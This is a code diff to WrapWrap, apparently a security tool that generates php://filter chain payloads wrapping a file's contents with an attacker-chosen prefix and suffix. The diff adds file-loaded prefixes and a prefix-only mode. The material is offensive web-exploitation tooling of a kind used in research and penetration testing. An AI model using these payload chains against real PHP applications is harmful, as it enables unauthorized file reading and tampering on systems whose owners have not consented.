@@ -69,6 +69,7 @@ from dataclasses import dataclass
 @arg("suffix", "A string to write after the contents of the file")
 @arg("output", "File to write the payload to. Defaults to chain.txt")
 @arg("padding_character", "Character to pad the prefix and suffix. Defaults to `M`.")
+@arg("from_file", "If set, prefix and suffix indicate files to load their value from, instead of the value itself")
 @dataclass
 class WrapWrap:
     """Generates a php://filter wrapper that adds a prefix and a suffix to the contents of a file.
@@ -88,20 +89,45 @@ class WrapWrap:
     nb_bytes: int
     output: str = "chain.txt"
     padding_character: str = "M"
+    from_file: bool = False
 
     def run(self) -> None:
+        if self.from_file:
+            self.prefix = read_bytes(self.prefix)
+            self.suffix = read_bytes(self.suffix)
+        else:
+            self.prefix = self.prefix.encode()
+            self.suffix = self.suffix.encode()
+        
         self.filters = []
-        self.compute_nb_chunks()
-        self.prelude()
-        self.add_suffix()
-        self.pad_suffix()
-        self.add_prefix()
-        self.postlude()
+        
+        if self.suffix:
+            self.compute_nb_chunks()
+            self.prelude()
+            self.add_suffix()
+            self.pad_suffix()
+            self.add_prefix()
+            self.postlude()
+        else:
+            self.add_simple_prefix()
 
         filters = "|".join(self.filters)
         payload = f"php://filter/{filters}/resource={self.path}"
         Path(self.output).write(payload)
         msg_success(f"Wrote filter chain to [b]{self.output}[/] (size={len(payload)}).")
+        
+    def add_simple_prefix(self):
+        """Just adds a prefix.
+        """
+        self / B64E / REMOVE_EQUAL
+        
+        prefix = self.align_right(self.prefix, 3)
+        prefix = self.b64e(prefix)
+        
+        for char in reversed(prefix):
+            self.push_char_safely(char)
+        
+        self / B64D
 
     def compute_nb_chunks(self) -> None:
         real_stop = self.align_value(self.nb_bytes, 9)
@@ -116,7 +142,7 @@ class WrapWrap:
         return self / self.conversions[c] / B64D / B64E
 
     def push_char_safely(self, c: str) -> None:
-        self.push_char(c) / "convert.iconv.855.UTF7"
+        self.push_char(c) / REMOVE_EQUAL
 
     def pad(self) -> None:
         """Pads the content of the file with some garbage to make sure we don't trim
@@ -238,6 +264,7 @@ class WrapWrap:
         the specified pad character.
         """
         p = p or self.padding_character
+        p = p.encode()
         padding_size = (n - len(input_str) % n) % n
         aligned_str = input_str.ljust(len(input_str) + padding_size, p)
 
